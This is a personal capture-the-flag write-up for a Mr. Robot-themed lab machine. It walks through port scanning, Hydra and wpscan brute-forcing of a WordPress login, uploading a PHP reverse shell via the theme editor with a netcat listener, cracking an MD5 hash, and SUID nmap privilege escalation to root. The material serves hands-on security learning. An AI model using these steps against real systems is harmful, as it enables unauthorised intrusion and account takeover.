Mr.robot challenge : 23 jul 2021

i really have fun solving this one as this is my best t.v show and this challenge covers alot of basics . 

![4547076-elliot-mr-robot-rami-malek-mr -robot-hackerman-hacking](https://user-images.githubusercontent.com/67979878/126735484-55b76572-fb75-49fa-8b76-acd25e331dee.png)


machine  ip :10.10.18.63



SCANNING
========
basic scanning
----------------

$ nmap -sV -v -Pn 10.10.18.63 -oN nmap/intial

```
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd

```

ENUMRATION
==========

$gobuster dir -u "http://10.10.18.63/" -w=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  | tee gobuster.txt

```
/blog                 (Status: 301) [Size: 232] [--> http://10.10.18.63/blog/]  
/login                (Status: 302) [Size: 0] [--> http://10.10.18.63/wp-login.php]
/wp-content           (Status: 301) [Size: 238] [--> http://10.10.18.63/wp-content/]
/admin                (Status: 301) [Size: 233] [--> http://10.10.18.63/admin/]                                 
/wp-login             (Status: 200) [Size: 2599]                                    
/wp-includes          (Status: 301) [Size: 239] [--> http://10.10.18.63/wp-includes/]           
/readme               (Status: 200) [Size: 64]                                       
/robots               (Status: 200) [Size: 41]   

```
/robots.txt

[*]fsocity.dic 'a dictionary so i downloaded it '

[*]key-1-of-3.txt


http://10.10.18.63/wp-login.php

- default usernames doesn't work 


$ wpscan --url 10.10.18.63  --enumerate u  

#no results for usernames but WordPress version 4.3.1 identified


fsocity.dic will be our reference to get a username and a valid passowrd .

But it is very large let's try some stuff :

$sort -o fsocity.dic fsocity.dic

$uniq fsocity.dic > unique

now it is smaller list so less time to get the credits.

Hydra
=======
[*] to get a user from the dictionary we got 

$ hydra  -L  fsocity.dic -p test  10.10.18.63  http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:F=Invalid username" -V  

[80][http-post-form] host: 10.10.18.63   login: Elliot   password: test


[*] to get password :

$ hydra -l Elliot -P fsocity.dic 10.10.18.63  http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username"  -I

X it takes too long time 

$ wpscan --url http://10.10.18.63 -U Elliot -P unique   


 | Username: Elliot, Password: ------ |  # try it your self .

now try them in the wordpress login page and it works .

EXPLOITAION
===========
downlaod pentester monkey php shell and modify 

ip = your ip 
port = any to listen at 

appearance > Editor > 404.php >upload 

-set your listener 
`$ nc -lvp 1234`

execute it :

http://10.10.18.63/wp-admin/404.php

now we have a shell as daemon .

STABLE SHELL
============
$python3 -c "import pty ; pty.spawn('/bin/bash')"

make sure you were using bash before setting the listenner .

after getting the shell background it via ctrl + z

$stty raw -echo

$fg

$export TERM=xterm 

now you have a stable shell .

PRIVILEGE ESCALATION
====================
/home/robot 

-rw-r--r-- 1 robot robot  39 Nov 13  2015 password.raw-md5

robot:c3fcd3d76192e4007dfb496cca67e13b   > crack it  > abcdefghijklmnopqrstuvwxyz

now we can be robot :)

$su robot # provide the password .

now we can read next key 

$cat /home/robot/key-2-of-3.txt 

now we need to be root to get last key .


checking suids ;

$find / -type f -user root -perm -4000 -exec ls -l {} + 2>/dev/null

this seems weird :

-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap

reading this :
----------------
https://pentestlab.blog/2017/09/25/suid-executables/ 

$ /usr/local/bin/nmap --interactive
nmap > !sh
## whoami =  root
#cat /root/key-3-of-3.txt




